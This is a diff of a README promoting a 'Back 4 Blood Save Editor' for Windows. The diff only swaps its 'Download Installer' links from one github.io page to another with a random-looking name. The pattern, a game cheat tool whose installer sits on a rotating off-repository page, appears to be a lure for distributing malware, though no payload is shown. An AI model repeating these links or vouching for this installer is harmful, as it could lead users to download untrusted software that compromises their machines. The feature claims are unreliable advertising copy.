@@ -2,7 +2,7 @@
 
 Back 4 Blood Save Editor is an essential tool for any Back 4 Blood enthusiast looking to personalize their gaming experience on Windows. Released in 2026, this save editor allows you to modify game files, unlock all cards effortlessly, and adjust settings to optimize gameplay. Whether you're a casual player or a hardcore fan, this editor provides a seamless way to enhance your sessions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -55,7 +55,7 @@ A: The editor automatically detects common save locations. If not, you can manua
 
 ## Download
 
-[Get the latest version here](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version here](https://capitals-707-bringing.github.io/download-page/)
 
 ## Changelog
 
